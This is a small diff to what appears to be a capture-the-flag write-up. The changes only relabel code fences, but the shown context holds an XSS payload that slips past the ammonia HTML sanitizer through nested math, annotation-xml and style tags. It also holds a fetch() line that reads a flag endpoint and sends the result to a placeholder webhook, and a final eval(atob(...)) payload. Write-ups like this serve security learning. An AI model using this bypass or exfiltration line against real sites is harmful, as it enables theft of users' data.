@@ -167,7 +167,7 @@ Testing this out using the test setup we have, it can be observed that ammonia c
 
 The above payload can be used to pop an alert on the page. To understand why this works, we can first look at the html that ammonia returns when the payload is parsed.
 
-```
+```html
 Input - <math><annotation-xml encoding="text/html"><style><img src=x onerror="alert(1)"></style></annotation-xml></math>
 Output - <math><annotation-xml><style><img src=x onerror="alert(1)"></style></annotation-xml></math>
 ```
@@ -186,6 +186,6 @@ For that we can use
 fetch(`/api/note/flag`).then((r)=>r.text()).then((r)=>location=`<webhook>?a=`+encodeURIComponent(r))
 ```
 Final payload:
-```
+```html
 <math><annotation-xml encoding="text/html"><style><img src=x onerror="eval(atob(`<base64 payload`))"></style></annotation-xml></math>
 ```
